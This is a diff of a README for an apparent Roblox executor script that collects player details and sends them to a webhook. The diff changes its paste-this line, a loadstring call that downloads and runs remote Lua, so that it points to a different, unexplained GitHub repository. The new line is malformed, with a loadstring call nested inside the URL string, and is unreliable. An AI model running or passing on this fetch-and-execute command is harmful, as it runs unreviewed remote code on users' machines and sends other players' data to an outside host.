@@ -4,7 +4,7 @@ A Lua script for gathering player details in Roblox games and sending them to a 
 - Fix the security thing for the executor.
 # Loadstring
 ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/StevenK-293/Roblox-Player-Info-Webhook/main/main.lua"))()
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/WitherCo/webhook/refs/heads/main/main.lua"))()
 ```
 # Customization
 The script can be customized to fit your specific needs. Here are a few areas you can modify:
